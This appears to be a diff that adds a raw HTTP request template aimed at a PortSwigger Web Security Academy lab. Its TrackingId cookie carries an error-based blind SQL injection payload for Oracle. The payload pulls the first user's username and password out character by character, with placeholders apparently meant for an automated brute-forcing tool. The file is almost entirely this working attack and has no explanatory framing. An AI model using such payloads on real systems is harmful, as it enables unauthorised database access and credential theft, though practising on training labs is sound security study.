@@ -1,0 +1,17 @@
+GET /filter?category=Gifts HTTP/1.1
+Host: 0add005b03d6f9ac83fbbea600070048.web-security-academy.net
+Connection: close
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0add005b03d6f9ac83fbbea600070048.web-security-academy.net/
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cookie: TrackingId=GKgyCfSkvt9X5zCN'+and+'a'%3d(select+case+when+({BFP}{OPE}ascii(substr((select+concat(USERNAME,PASSWORD)+from+USERS+where+rownum%3d1),{INC_1},1)))+then+to_char(1/0)+else+'a'+end+from+dual)+and+'a'='a; session=cbU1pXYnQJeIG3caf4ojsM4ypVjEMONp
+
